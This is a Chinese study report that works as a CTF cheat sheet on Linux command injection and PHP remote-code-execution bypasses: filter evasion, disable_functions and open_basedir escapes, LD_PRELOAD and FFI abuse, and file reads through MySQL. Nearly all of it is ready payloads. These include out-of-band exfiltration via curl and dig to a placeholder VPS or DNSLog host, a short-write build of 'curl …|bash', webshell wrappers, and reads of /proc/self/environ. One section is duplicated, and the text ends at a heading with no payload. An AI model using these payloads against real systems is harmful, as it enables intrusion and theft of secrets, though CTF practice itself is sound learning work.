# 完成事项

+ ## web方面

  总结了ctfshow的一些知识点

---

# 下周待做事项

session包含和条件竞争

---

# 本周学习知识分享

## 1. Linux Shell 命令注入

### 1.1 命令分隔符与多命令执行

**原理**：利用 Shell 语法中的逻辑运算符、管道符或控制字符，在单行输入中执行多条命令。

#### 逻辑运算符

```php
// 场景: system($cmd) 中分号 (;) 被禁用，需要执行额外命令
// 源码: 
system("ping -c 1 " . $ip);

// Payload 1: 分号 (标准分隔)
?ip=127.0.0.1;whoami

// Payload 2: 逻辑与 (前一条成功才执行后一条)
?ip=127.0.0.1&&whoami

// Payload 3: 逻辑或 (前一条失败才执行后一条 - 配合非法IP使用)
?ip=1.1.1.1||whoami

// Payload 4: 管道符 (将前一条输出作为后一条输入)
?ip=127.0.0.1|whoami

// Payload 5: 后台运行 (异步执行)
?ip=127.0.0.1&whoami
```

#### 控制字符与注入变体

```php
// 场景: 常见逻辑符号被过滤，利用换行符或命令替换
// 源码: 
system($c);

// Payload 1: URL 编码换行符 (LF)
?c=127.0.0.1%0awhoami

// Payload 2: URL 编码回车换行 (CRLF)
?c=127.0.0.1%0d%0awhoami

// Payload 3: 反引号命令替换 (优先执行反引号内命令)
?c=`whoami`

// Payload 4: $() 命令替换 (优先执行括号内命令)
?c=$(whoami)

// 解析:
// 1. 在 Linux Shell 中，换行符 (%0a) 意味着一行命令的结束和下一行的开始。
// 2. 命令替换会将执行结果替换回当前位置。
```

### 1.2 空格过滤绕过

**原理**：Shell 中空格通常作为参数分隔符，被过滤时可利用内部字段分隔符（IFS）、重定向符或大括号扩展替代。

#### 环境变量与特殊字符

```php
// 场景: WAF 过滤了空格 (\s, Space, %20)
// 源码: 
system($c);

// Payload 1: ${IFS}
?c=cat${IFS}/flag

// Payload 2: $IFS$9 ($9是空参数，防止与后续字符粘连)
?c=cat$IFS$9/flag

// Payload 3: $IFS (仅当后续字符非数字字母时可用)
?c=cat$IFS/flag

// Payload 4: Tab 键 (URL编码 %09)
?c=cat%09/flag

// 解析:
// 1. $IFS (Internal Field Separator) 默认为空格、Tab 和换行符。
// 2. $9 是当前 Shell 进程的第 9 个参数，通常为空，用于截断变量名。
```

#### 重定向与大括号扩展

```php
// 场景: $ 符号也被过滤，无法使用变量
// 源码: 
system($c);

// Payload 1: 输入重定向 (仅适用于单文件读取)
?c=cat</flag

// Payload 2: 读写重定向 (部分 Shell 支持)
?c=cat<>/flag

// Payload 3: 大括号扩展 (Shell 自动展开，逗号变空格)
?c={cat,/flag}

// 解析:
// 1. < 符号让 Shell 打开文件并作为输入流传递给命令，无需空格分隔。
// 2. {a,b} 在 Bash 中会被扩展为 "a" "b"，中间自动带空格。
```

### 1.3 关键词黑名单绕过

**原理**：利用 Shell 解析器的拼接特性、转义字符或通配符，破坏 WAF 对 `flag`、`cat`、`system` 等关键词的正则匹配。

#### 拼接与转义 (引号/反斜杠)

```php
// 场景: 过滤了 "flag", "cat" 字符串
// 源码: 
system($c);

// Payload 1: 反斜杠转义
?c=c\at /fl\ag

// Payload 2: 单引号拼接 (空串)
?c=c''at /fl''ag

// Payload 3: 双引号拼接 (空串)
?c=c""at /fl""ag

// Payload 4: 混合拼接
?c=ca''\t /fl""ag
```

#### 变量赋值与切片

```php
// 场景: 引号被过滤，利用变量重组
// 源码: 
system($c);

// Payload 1: 变量拼接
?c=a=c;b=at;$a$b /flag

// Payload 2: 变量切片 (取 path 变量中的字符)
// 假设 $PATH 包含 /bin，则 ${PATH:0:1} 为 /
?c=cat ${PATH:0:1}flag

// Payload 3: 插入未定义变量 (默认为空)
?c=ca${x}t /fl${y}ag
?c=ca$@t /fl$*ag  // (利用 $@ $* 特殊变量)
```

#### 编码执行 (Base64/Hex/Octal)

```php
// 场景: 过滤极严，但允许 echo, base64 或 printf
// 源码: 
system($c);

// Payload 1: Base64 解码执行
?c=echo Y2F0IC9mbGFn|base64 -d|bash

// Payload 2: Hex (十六进制) 编码执行 (需 bash)
?c=echo -e "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"|bash
// 变体 (ANSI C Quoting):
?c=$'\x63\x61\x74\x20\x2f\x66\x6c\x61\x67'

// Payload 3: Octal (八进制) 编码执行
?c=$(printf "\143\141\164\040\057\146\154\141\147")
```

### 1.4 通配符绕过

**原理**：利用 Shell 的通配符模糊匹配文件名或命令，规避完整关键词检测。

```php
// 场景: 精准过滤了 cat, flag, /bin/sh 等完整路径或文件名
// 源码: 
system($c);

// Payload 1: 问号 (?) 匹配单字符
?c=/bin/c?? /fl?g
?c=/???/??t /???g

// Payload 2: 星号 (*) 匹配任意长度字符
?c=/bin/c* /fl*g

// Payload 3: 字符集 ([]) 匹配指定范围
?c=c[a]t /fl[a]g
?c=c[a-z]t /fl[a-z]g
```

### 1.5 文件读取替代方案

**原理**：`cat` 是最常被禁的命令，系统中存在大量可输出文件内容的工具，必须全部掌握。

#### 基础查看类

```php
// 场景: cat 被禁
// 源码: 
system($c);

// Payload 1: tac (反向输出)
?c=tac /flag

// Payload 2: more (分页显示)
?c=more /flag

// Payload 3: less (分页显示)
?c=less /flag

// Payload 4: head (查看头部，默认10行)
?c=head /flag
?c=head -n 1 /flag

// Payload 5: tail (查看尾部，默认10行)
?c=tail /flag
?c=tail -n 1 /flag
```

#### 文本处理与编辑器类

```php
// 场景: 基础查看命令全被禁，利用数据处理工具
// 源码: 
system($c);

// Payload 1: nl (输出并显示行号)
?c=nl /flag

// Payload 2: od (八进制输出，避开 flag{} 关键字检测)
?c=od -c /flag

// Payload 3: xxd (十六进制输出)
?c=xxd /flag

// Payload 4: hexdump (十六进制输出)
?c=hexdump -C /flag

// Payload 5: sort (排序输出)
?c=sort /flag

// Payload 6: uniq (去重输出)
?c=uniq /flag

// Payload 7: rev (每行内容倒序输出)
?c=rev /flag  // (输出 galf{...)

// Payload 8: paste (合并文件输出)
?c=paste /flag

// Payload 9: diff (文件比对，与空文件比对即输出全文)
?c=diff /flag /etc/passwd
```

#### 编程语言与高级工具类

```php
// 场景: 系统安装了脚本语言环境
// 源码: 
system($c);

// Payload 1: grep (搜索匹配)
?c=grep . /flag

// Payload 2: awk (文本分析)
?c=awk '{print}' /flag

// Payload 3: sed (流编辑)
?c=sed '' /flag

// Payload 4: perl (Perl 脚本)
?c=perl -pe '' /flag

// Payload 5: python (Python 脚本)
?c=python -c "print(open('/flag').read())"

// Payload 6: php (PHP 命令行)
?c=php -r "readfile('/flag');"
```

### 1.6 无回显注入

**原理**：当 `system` 等函数的输出被重定向到 `/dev/null` 或未被 `echo` 出来，或者 WAF 拦截了包含 Flag 的响应包时，利用时间延迟或带外通道（OOB）来确认命令是否执行。

#### 时间盲注

```php
// 场景: 页面无任何回显，无法判断命令是否执行
// 源码: 
exec($c);

// Payload 1: sleep (延时)
?c=sleep 5
?c=1;sleep 5

// Payload 2: ping (通过发包次数产生延时)
?c=ping -c 5 127.0.0.1  // (Linux ping 不会自动停止，必须加 -c)

// 解析:
// 1. 如果页面响应时间增加了 5 秒，说明命令注入成功。
```

#### 带外通道 (DNS/HTTP OOB)

```php
// 场景: 目标出网，利用外部服务器接收结果
// 源码: 
exec($c);

// Payload 1: Curl (HTTP 请求)
?c=curl http://【VPS_IP】/`whoami`
?c=curl http://【VPS_IP】/?d=`cat /flag|base64`

// Payload 2: Wget (HTTP 请求)
?c=wget http://【VPS_IP】/`whoami`

// Payload 3: Ping (DNS 请求，适用于无 TCP 连接权限)
?c=ping -c 1 `whoami`.【DNSLog_Domain】

// Payload 4: Dig (DNS 请求)
?c=dig `whoami`.【DNSLog_Domain】

// 解析:
// 1. 将命令执行结果拼接到 URL 或子域名中。
// 2. 在 VPS 或 DNSLog 平台上查看访问记录获取结果。
```

#### 写入 Web 目录

```php
// 场景: 知道 Web 目录路径，且有写入权限
// 源码: 
exec($c);

// Payload 1: 重定向写入
?c=whoami > /var/www/html/result.txt
?c=cat /flag > static/1.txt

// Payload 2: tee 命令 (读取标准输入并写入文件)
?c=whoami | tee result.txt
```

### 1.7 长度限制突破

**原理**：利用 Linux 文件名存储数据的特性，通过 `ls -t` 按时间排序拼接出长命令。

```php
// 场景: strlen($cmd) < 7，无法输入完整命令
// 源码: 
system($c);

// Payload 构造步骤:
// 目标命令: curl 1.2.3.4|bash

// 1. 创建分割的文件名 (倒序创建)
?c=>bash
?c=>\|
?c=>4
?c=>3.
?c=>2.
?c=>1.
?c=>\ 
?c=>rl
?c=>cu

// 2. 将文件名写入脚本文件
?c=ls -t>a

// 3. 执行脚本
?c=sh a

// 解析:
// 1. >filename 创建空文件。
// 2. ls -t 按修改时间倒序排列 (后创建的排在前面)。
// 3. 文件 a 内容变为: cu rl \  1. 2. 3. 4 \| bash
// 4. sh a 执行时自动拼接成 curl 1.2.3.4|bash
```

------

## 2. PHP 代码与命令执行

### 2.1 函数名与关键字过滤绕过

**原理**：利用 PHP 语法的灵活性（大小写不敏感、字符串拼接、编码解析、注释干扰）混淆函数名，规避 WAF 对 `system`、`exec` 等关键字的正则匹配。

#### 字符串拼接与变形

```php
// 场景: system, exec, passthru 等函数名被过滤
// 源码: 
eval($c);

// Payload 1: 动态拼接
$a='sys';$b='tem';$a . $b . ('ls');
('sys'.'tem')('ls');

// Payload 2: 大小写绕过 (PHP 函数名不敏感)
sYsTeM('ls');
ExEc('whoami');

// Payload 3: 字符串逆序 (strrev)
strrev('metsys')('ls');

// Payload 4: 注释符干扰 (/**/ 可替代空格或打断正则)
system/**/('ls');
system/**/(/**/'ls');

// Payload 5: 数组回调 (利用回调函数执行)
$a='system';
call_user_func($a, 'ls');
array_map($a, ['ls']);
```

#### 编码与进制转换

```php
// 场景: 过滤了明文函数名，但允许十六进制或八进制
// 源码: 
eval($c);

// Payload 1: 十六进制字符串 (Double Quotes 解析)
"\x73\x79\x73\x74\x65\x6d"("ls"); 

// Payload 2: 八进制字符串
"\163\171\163\164\145\155"("ls");

// Payload 3: unicode 编码 (JSON 解析场景)
// 若入口是 json_decode，可用 \u0073ystem
```

### 2.2 括号与符号限制绕过

**原理**：当**括号 `()` 或引号 `' "` 被过滤**时，利用 PHP 语言结构或特殊操作符进行代码执行。

#### 语言结构 (无括号执行)

```php
// 场景: 过滤了括号 ()，无法调用 standard 函数
// 源码: 
eval($c);

// Payload 1: include
include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php

// Payload 2: require (同 include)
require$_GET[1]?>&1=/flag

// Payload 3: echo / print (仅输出，无法 RCE)
echo`ls`; 

// Payload 4: die / exit (配合反引号执行并输出)
die(`ls`);
exit(`ls`);
```

#### 引号绕过

```php
// 场景: 单引号和双引号被禁
// 源码: 
eval($c);

// Payload 1: 反引号 (Shell 执行)
echo `ls`;

// Payload 2: 变量获取 (利用 GET/POST 参数)
system($_GET[1]);&1=ls

// Payload 3: Heredoc (定界符)
echo <<<EOF
ls
EOF;

// Payload 4: 数字/数学运算构造字符串 (见 2.4)
```

### 2.3 参数中转与长度限制突破

**原理**：利用 PHP 的可变变量 `$$` 或数组操作函数，将受限的入口参数转发到不受限的参数中执行。

#### 数组操作链 (GET/POST/COOKIE)

```php
// 场景: 限制输入长度 < 10 或过滤严格
// 源码: 
eval($c);

// Payload 1: 基础中转 (利用短参数名)
eval($_GET[a]);&a=system('ls');

// Payload 2: 数组弹出 (利用 array_pop, end, current)
// URL: ?c=eval(end($_GET));&a=system('ls');
eval(end($_GET));

// Payload 3: 获取所有变量 (get_defined_vars)
// 原理: get_defined_vars() 返回包含 GET/POST/COOKIE 的二维数组
// URL: ?c=eval(end(current(get_defined_vars())));&b=system('ls');
eval(end(current(get_defined_vars())));
```

#### 可变变量

```php
// 场景: 过滤了大部分函数，但允许 $
// 源码: 
eval($c);

// Payload:
// ?c=$$a;&a=system&system=ls
$$a;
```

### 2.4 无字母数字 RCE

**原理**：在 `/[a-z0-9]/i` 被过滤的情况下，利用异或 (`^`)、取反 (`~`)、自增 (`++`) 或位运算生成字符串。

#### 异或运算

```php
// 场景: 过滤字母数字，允许符号
// 源码: 
eval($c);

// Payload 1: 生成 _GET 变量
// ('?'^'`') => '_'
// ('{'^'/') => 'G'
// ('{'^'+') => 'E'
// ('{'^'.') => 'T'
$_=('%3f'^'`').('%7b'^'/').('%7b'^'+').('%7b'^'.'); // $_='_GET'
$__=${$_}; // $__=$_GET
$__[_]($__[__]); // $_GET['_']($_GET['__'])
// URL参数: &_=system&__=ls

// Payload 2: 直接生成 system
('('*'~'^'`').('('*'~'^'/').('('*'~'^'|').('('*'~'^'|').('('*'~'^'{').('('*'~'^'-')('ls');
```

#### 取反运算

```php
// 场景: 利用不可见字符或高位字符取反得到可见字符
// 源码: 
eval($c);

// Payload: 
// ~%8f%97%8f%96%91%99 => system
// ~%93%8c => ls
(~%8f%97%8f%96%91%99)(~%93%8c);

// 解析:
// 1. 利用脚本先计算好 system 的取反值 (Hex)。
// 2. URL 编码传输。
```

#### 自增运算

```php
// 场景: PHP 7/8 中 'a'++ => 'b'
// 源码: 
eval($c);

// Payload:
$_=[].'';$_=$_[''=='']; // $_="Array"
$____=$_[0]; // $____="A"
$____++;$____++;... // 自增得到 S, Y, S, T, E, M
```

#### 数学函数转换

```php
// 场景: 允许 base_convert 等数学函数
// 源码: 
eval($c);

// Payload:
// base_convert(1751504350, 10, 36) => "system"
base_convert(1751504350,10,36)(base_convert(784,10,36)); // system(sh)

// 变体 (通过 hex2bin 获取字符):
hex2bin(73797374656d)('ls'); // system('ls')
```

### 2.5 伪协议与特殊封装

**原理**：利用 PHP 封装协议 (`php://`, `data://`) 引入外部代码或绕过内容检测。

#### Data 协议

```php
// 场景: allow_url_include=On, 过滤了本地文件名
// 源码: 
include($file);

// Payload 1: 明文代码
data://text/plain,<?php system('ls');?>

// Payload 2: Base64 编码 (避开 <?php 过滤)
data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+
```

#### Input 协议

```php
// 场景: allow_url_include=On, 只需要文件句柄
// 源码: 
include($file);

// Payload:
// URL: ?file=php://input
// POST Body: <?php system('ls'); ?>
```

#### Filter 协议

```php
// 场景: file_put_contents($file, "<?php exit();" . $content);
// 原理: 利用 Base64 解码忽略非法字符的特性，吃掉 exit
// Payload:
php://filter/write=convert.base64-decode/resource=shell.php
// Content (需计算长度补位):
aPD9waHAgc3lzdGVtKCJscyIpOz8+
```

### 2.6 输出与调试函数全集

**原理**：在没有回显或需要调试对象结构时，必须穷举所有输出函数。

#### 基础输出

```php
// 场景: echo 被禁
// 源码: 
eval($c);

// Payload 1: print (有返回值)
print('123');

// Payload 2: printf (格式化输出)
printf("%s", '123');

// Payload 3: vprintf (输出数组值)
vprintf("%s", ['123']);
```

#### 调试输出

```php
// 场景: 结果是数组 (如 scandir)，echo 无法打印
// 源码: 
eval($c);

// Payload 1: print_r (打印易读格式)
print_r(scandir('.'));

// Payload 2: var_dump (打印详细类型与值)
var_dump(scandir('.'));

// Payload 3: var_export (打印合法的 PHP 代码)
var_export(scandir('.'));
```

#### 异常与终止输出

```php
// 场景: 正常的输出流被截断或清洗
// 源码: 
eval($c);

// Payload 1: die (输出并退出)
die('flag');

// Payload 2: exit (输出并退出)
exit('flag');

// Payload 3: 抛出异常 (利用报错信息回显)
throw new Exception('flag');
```

### 2.7 流程控制与执行终止

**原理**：在 Payload 执行后立即结束脚本，防止后续代码（如 `ob_clean`, `preg_replace`）清除或破坏缓冲区中的输出。

```php
// 场景: eval($c); ob_end_clean();
// 源码: 
eval($c);

// Payload 1: exit (推荐)
system('ls');exit();

// Payload 2: die
system('ls');die();

// Payload 3: fastcgi_finish_request (仅限 PHP-FPM)
// 原理: 立即将响应发送给客户端，并在后台继续执行后续代码(如有需要)
echo `ls`;fastcgi_finish_request();
```

```php
// 场景: 限制输入长度 < 10 或过滤严格
// 源码: 
eval($c);

// Payload 1: 基础中转 (利用短参数名)
eval($_GET[a]);&a=system('ls');

// Payload 2: 数组弹出 (利用 array_pop, end, current)
// URL: ?c=eval(end($_GET));&a=system('ls');
eval(end($_GET));

// Payload 3: 获取所有变量 (get_defined_vars)
// 原理: get_defined_vars() 返回包含 GET/POST/COOKIE 的二维数组
// URL: ?c=eval(end(current(get_defined_vars())));&b=system('ls');
eval(end(current(get_defined_vars())));
```

#### 可变变量

```php
// 场景: 过滤了大部分函数，但允许 $
// 源码: 
eval($c);

// Payload:
// ?c=$$a;&a=system&system=ls
$$a;
```

### 2.8 PHP 短标签与命令执行简写

**原理**：利用 PHP 开启短标签时的语法特性，结合 Shell 反引号实现无函数名、极短长度的命令执行。

#### 语法等价关系

1. `<?php echo shell_exec('cat /flag'); ?>` (标准形态)
2. `<?= shell_exec('cat /flag'); ?>` (`<?=` 等价于 `<?php echo`)
3. `<?= `cat /flag`; ?>` (反引号 `` ` `` 等价于 `shell_exec`)

#### 绕过实战

```php
// 场景 1: WAF 过滤了 "php", "echo", "system" 等关键字
// 源码: file_put_contents($file, $content); 注入到可访问文件

// Payload 1: 基础命令简写
<?= `cat *`; ?>

// Payload 2: 结合通配符绕过关键词过滤
<?= `c\at /f*`; ?>

// Payload 3: 绕过分号限制 (PHP 闭合标签 ?> 隐含分号)
<?= `ls`?>

// 解析:
// 1. <?= 自 PHP 5.4 起始终可用，不受配置限制。
// 2. 反引号调用的是系统 Shell，如果 disable_functions 禁用了 shell_exec，此方法失效。
// 3. 在长度受限的 RCE（如 7 字符限制）中，这是唯一的生存手段。
```

---

## 3. 绕过 disable_functions 与 open_basedir

### 3.1 语言结构与基础输出替代

**原理**：`disable_functions` 仅能禁用“函数”，无法禁用“语言结构”。当 `var_dump`, `print_r` 等调试函数被禁时，必须回归最原始的输出方式。

#### 免疫列表

```php
// 场景: echo, include, require 等出现在 disable_functions 列表中 (配置欺骗)
// 源码: 
eval($c);

// Payload 1: 包含 (RCE 核心)
include('flag.php');
require('/flag');

// Payload 2: 基础输出 (语言结构)
echo 'test';
print 'test';

// Payload 3: 终止与状态
die('message');
exit('message');
```

#### 调试函数替代

```php
// 场景: 需要打印数组 (如 scandir 的结果)，但 print_r/var_dump 被禁
// 源码: 
eval($c);

// Payload 1: foreach 遍历 (最稳健)
$dir = scandir('/'); foreach($dir as $f){ echo $f."\n"; }

// Payload 2: implode / join (转字符串输出)
echo implode("\n", scandir('/'));

// Payload 3: json_encode (转 JSON 字符串)
echo json_encode(scandir('/'));

// Payload 4: serialize (序列化输出)
echo serialize(scandir('/'));
```

### 3.2 环境配置探测

**原理**：`phpinfo()` 常被禁用，需使用其他配置读取函数获取 `disable_functions` 黑名单。

#### 配置读取函数全集

```php
// 场景: phpinfo() 被禁
// 源码: 
eval($c);

// Payload 1: ini_get (获取单个配置)
echo ini_get('disable_functions');
echo ini_get('open_basedir');

// Payload 2: ini_get_all (获取所有配置项为数组 - 需配合 foreach 输出)
$arr = ini_get_all(); foreach($arr as $k=>$v){ echo $k.": ".json_encode($v)."\n"; }

// Payload 3: get_cfg_var (获取 php.ini 原始设置)
echo get_cfg_var('disable_functions');
```

### 3.3 文件读取绕过

**警告**：`file_get_contents`、`highlight_file`、`readfile` 是重点封锁对象。必须掌握基于 **文件句柄 (Handle)** 和 **OOP** 的冷门读取方式。

#### 常用函数替补链

```php
// 场景: file_get_contents, highlight_file, readfile 全被禁
// 源码: 
eval($c);

// Payload 1: fopen + fread (句柄读取 - 定长)
$h = fopen('/flag', 'r'); echo fread($h, 1024); fclose($h);

// Payload 2: fopen + fgetc (句柄读取 - 逐字符，防内存溢出)
$h = fopen('/flag', 'r'); while(!feof($h)){ echo fgetc($h); } fclose($h);

// Payload 3: file (读入数组) + implode
echo implode('', file('/flag'));

// Payload 4: include (利用伪协议转 Base64，避开 PHP 解析)
// 条件: allow_url_include=On 或 只是读取纯文本
include('php://filter/read=convert.base64-encode/resource=/flag');

// Payload 5: SplFileObject (OOP 方式 - 极强，详见 4.1)
$f = new SplFileObject('/flag'); foreach($f as $l){ echo $l; }
```

### 3.4 目录遍历与探测

**警告**：`scandir` 常被禁用。

#### 目录扫描替代

```php
// 场景: scandir 被禁
// 源码: 
eval($c);

// Payload 1: glob (模式匹配)
// 注意: glob 返回数组，需配合 foreach 输出
$files = glob('/*'); foreach($files as $f){ echo $f."\n"; }

// Payload 2: DirectoryIterator (OOP 方式 - 推荐)
$d = new DirectoryIterator('/'); foreach($d as $f){ echo $f."\n"; }

// Payload 3: dir (类对象)
$d = dir('/'); while(($f = $d->read()) !== false){ echo $f."\n"; }
```

### 3.5 open_basedir 绕过技巧

#### 软连接逻辑绕过

**条件**：`symlink` 函数未被禁用，且对目录有写权限。

```php
// 场景: 允许执行多行 PHP 代码，且 file_get_contents 可能被禁
// 源码: 
eval($c);

// Payload:
// 1. 构造目录穿越与软连接
mkdir('A');chdir('A');mkdir('B');chdir('B');mkdir('C');chdir('C');mkdir('D');chdir('D');
chdir('../../..');
symlink('A/B/C/D', 'dummy'); 
chdir('dummy/../../../../');
symlink('/flag', 'lnk');

// 2. 读取软连接指向的文件 (多种替代方案)

// 方案 A: file_get_contents (最易被禁)
// echo file_get_contents('lnk');

// 方案 B: SplFileObject (OOP - 推荐，高概率未禁)
$f = new SplFileObject('lnk'); foreach($f as $l){ echo $l; }

// 方案 C: fopen + fgetc (句柄操作 - 基础稳健)
$h = fopen('lnk','r'); while(!feof($h)){ echo fgetc($h); }

// 方案 D: readfile (直接输出)
readfile('lnk');

// 方案 E: include (利用 Base64 读)
include('php://filter/read=convert.base64-encode/resource=lnk');
```

#### 真实路径解析

```php
// 场景: 利用 realpath 配合 ini_set 绕过 (特定旧版本)
// Payload:
ini_set('open_basedir', '/var/www/html/');
chdir('/');ini_set('open_basedir','/');
echo file_get_contents('/flag');
```

### 3.6 进阶 RCE：利用系统组件绕过

#### LD_PRELOAD (劫持系统函数)

```php
// 场景: putenv 和 mail 可用
// 源码: 
eval($c);

// Payload:
putenv("LD_PRELOAD=/tmp/evil.so"); 
mail("", "", "", ""); 
```

#### FFI (外部函数接口)

**优势**：FFI 可以定义 C 语言函数，**完全绕过 PHP 的 `disable_functions` 和 `file_get_contents` 限制**。

```php
// 场景: PHP 7.4+, FFI 开启
// 源码: 
eval($c);

// Payload 1: 模拟 system (无回显/写入 Web 目录)
// 原理: 直接调用 C 的 system 函数，利用重定向将结果写入 Web 根目录，直接下载查看。
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("ls / > 1.txt");

// Payload 2: 配合 exit 绕过后置清洗
// 场景: eval 后有 preg_replace 或 ob_clean 等操作会破坏输出
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("ls / > 1.txt");
exit(); // 强制终止脚本，跳过后续的清洗代码

// Payload 3: 直接读取结果 (popen/fgets)
// 场景: Web 目录不可写，必须直接回显
$ffi_read = FFI::cdef("
    void *popen(char *command, char *type);
    char *fgets(char *s, int size, void *stream);
    int pclose(void *stream);
");
$stream = $ffi_read->popen("ls /", "r");
if($stream){
    $buf = FFI::new("char[1024]");
    while($ffi_read->fgets($buf, 1024, $stream)){
        echo FFI::string($buf);
    }
    $ffi_read->pclose($stream);
}

// 解析:
// 1. FFI::cdef 定义 C 语言函数原型。
// 2. Payload 1 & 2 适合 Web 目录可写的情况，直接访问 /1.txt 查看结果。
// 3. Payload 3 适合 Web 目录不可写的情况，直接从内存流中读取回显。
```

#### PHP-FPM / Mod_CGI

```php
// 场景: 存在 SSRF 或可操作 socket
// 1. PHP-FPM: 利用 Gopherus 生成 Payload，修改 PHP_VALUE 加载 auto_prepend_file。
// 2. Apache Mod_CGI: 利用 .htaccess 开启 CGI 解析。

// Payload (.htaccess RCE):
// Options +ExecCGI
// AddHandler cgi-script .xx
// (上传 shell.xx 脚本并访问)
```

---

## 4. OOP 原生类绕过与内核漏洞

### 4.1 SplFileObject (文件读取替补)

**原理**：`disable_functions` 通常只禁用全局函数（如 `fopen`, `readfile`）。`SplFileObject` 是 PHP 面向对象的文件处理接口，其类方法往往不在监控范围内。

#### 基础文件读取

```php
// 场景: fopen, file_get_contents, readfile 全被禁用
// 源码: 
eval($c);

// Payload 1: 逐行遍历 (内存友好，推荐)
$f=new SplFileObject('/flag');foreach($f as $l){echo $l;}

// Payload 2: 一次性读取 (fread)
$f=new SplFileObject('/flag');echo $f->fread($f->getSize());

// Payload 3: 配合 Base64 (防止二进制截断或编码问题)
$f=new SplFileObject('/flag');echo base64_encode($f->fread($f->getSize()));

// 解析:
// 1. SplFileObject 提供了一套完整的文件操作方法。
// 2. 除非管理员在 disable_classes 中禁用了该类，否则永远可用。
```

### 4.2 DirectoryIterator (目录遍历替补)

**原理**：替代 `scandir` 和 `glob` 函数。配合 `glob://` 伪协议，**可直接无视 `open_basedir` 限制**列出目录（仅限列目录，不可读文件）。

#### 目录迭代与 Glob 协议

```php
// 场景: scandir 被禁，或存在 open_basedir 限制
// 源码: 
eval($c);

// Payload 1: 标准迭代 (受 open_basedir 限制)
$d=new DirectoryIterator('/');foreach($d as $f){echo $f.' ';}

// Payload 2: GlobIterator (自带通配符)
$d=new GlobIterator('/*flag*');foreach($d as $f){echo $f.' ';}

// Payload 3: FilesystemIterator (文件系统迭代器)
$d=new FilesystemIterator('/');foreach($d as $f){echo $f.' ';}

// Payload 4: 配合 glob:// 协议 (绕过 open_basedir)
// 原理: glob:// 协议在底层实现时，部分版本未严格校验 open_basedir
$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo $f->__toString()." ";}

// 解析:
// 1. 若列出的文件名包含 "flag"，再使用 SplFileObject 或数据库读取。
```

### 4.3 数据库扩展类 (PDO / MySQLi)

**原理 (核心绕过机制)**： 当 PHP 自身的文件读取能力（包括 SPL）被全禁或被 `open_basedir` 锁死时，利用 PHP 连接数据库（MySQL）。 **利用 MySQL 软件本身**的 `load_file()` 函数读取文件。 **本质**：读文件的动作是由 MySQL 进程（mysqld）执行的，而非 PHP 进程。**MySQL 进程不受 PHP `open_basedir` 和 `disable_functions` 的管辖**。

#### 4.3.1 扩展可用性探测

**原理**：在 `phpinfo` 和 `var_dump` 不可用或输出混乱的情况下，利用 `class_exists`（检查类是否定义）或 `extension_loaded`（检查扩展是否加载）返回明确的字符串信号。

```php
// 场景: phpinfo 被禁，var_dump 被禁用或输出不可读，需确认是否安装了数据库扩展
// 源码: 
eval($c);

// Payload 1: class_exists (推荐，最稳健)
// 原理: 直接检测类定义，不受 disable_functions 影响，返回 1 或 空
echo class_exists('PDO') ? 'PDO_OK' : 'No_PDO';
echo class_exists('mysqli') ? 'MySQLi_OK' : 'No_MySQLi';

// Payload 2: extension_loaded (检测底层扩展)
echo extension_loaded('pdo_mysql') ? 'Ext_OK' : 'Ext_No';
echo extension_loaded('mysqli') ? 'Ext_OK' : 'Ext_No';

// Payload 3: ReflectionExtension (OOP 反射探测)
// 场景: 过程式函数全禁，利用反射类获取扩展信息
try {
    $e = new ReflectionExtension('pdo_mysql');
    echo 'Found: ' . $e->getName();
} catch (Exception $e) {
    echo 'Not Found';
}

// 解析:
// 1. 避免使用布尔值直接输出 (false 会输出空字符串)，使用三元运算符输出明确字符。
// 2. 确认 PDO_OK 或 MySQLi_OK 后，再使用后续 Payload。
```

#### 4.3.2 PDO 方式

**前提条件**：

1. 已安装 `pdo_mysql` 扩展（通过 4.3.1 确认）。
2. 已知数据库账号密码（CTF 常见 `root:root`）。
3. 数据库用户拥有 `FILE` 权限。

```php
// 场景: PHP 层文件函数全死，尝试 "借刀杀人" (利用 MySQL)
// 源码: 
eval($c);

// Payload:
$dbh=new PDO('mysql:host=localhost;dbname=information_schema','root','root');
foreach($dbh->query('select load_file("/flag")') as $row){
    echo $row[0];
}

// 解析:
// 1. 建立数据库连接。
// 2. 执行 SQL 语句 select load_file(...)。
// 3. 将结果回显。
```

#### 4.3.3 MySQLi 方式

**场景**：`PDO` 类被禁用，但 `mysqli` 类可用（通过 4.3.1 确认）。

```php
// 场景: 利用 MySQLi 接口读取文件
// 源码: 
eval($c);

// Payload:
$m=new mysqli('localhost','root','root','information_schema');
echo $m->query('select load_file("/flag")')->fetch_row()[0];

// 解析:
// 1. mysqli 是 PHP 的另一套 MySQL 接口，语法略有不同。
// 2. fetch_row()[0] 获取结果集的第一列内容。
```

### 4.4 间接环境探测 (/proc 伪文件)

**原理**：Linux 下的 `/proc` 目录包含系统运行时信息。利用 `SplFileObject` 读取这些文件，可替代 `phpinfo()`、`getenv()` 等函数。

```php
// 场景: phpinfo, getenv 被禁，需搜集信息
// 源码: 
eval($c);

// Payload 1: 获取环境变量 (/proc/self/environ)
// 包含: PWD, PATH, 以及可能的 SECRET_KEY 或 Docker 内部 IP
$f=new SplFileObject('/proc/self/environ');foreach($f as $l){echo $l;}

// Payload 2: 获取启动命令 (/proc/self/cmdline)
// 包含: 加载的配置文件路径 (php.ini), 运行模式 (Apache/FPM)
$f=new SplFileObject('/proc/self/cmdline');foreach($f as $l){echo $l;}

// Payload 3: 探测 ARP 表 (/proc/net/arp)
// 包含: 内网其他机器 IP (用于进一步渗透)
$f=new SplFileObject('/proc/net/arp');foreach($f as $l){echo $l;}
```

### 4.5 PHP 内核漏洞 (UAF)

**原理**：Use-After-Free (内存释放后重用)。通过精心构造的 PHP 代码触发解释器底层的内存管理错误，修改内存中的函数指针，使其指向 `system` 函数的地址。 **为何能绕过一切**：

1. **无视 disable_functions**：代码直接操作内存地址调用 `system`，不经过 PHP 函数表的查找检查。
2. **无视 open_basedir**：代码执行的是系统命令（如 `cat /flag`），这是 Shell 层的操作，PHP 的目录限制管不到 Shell。

#### 适用版本

- **PHP 7.0 - 7.3**: 推荐 `GC Bypass` (Garbage Collection).
- **PHP 7.0 - 7.4**: 推荐 `Backtrace Bypass` (利用 debug_backtrace 触发).

#### Backtrace UAF Payload (无文件利用版)

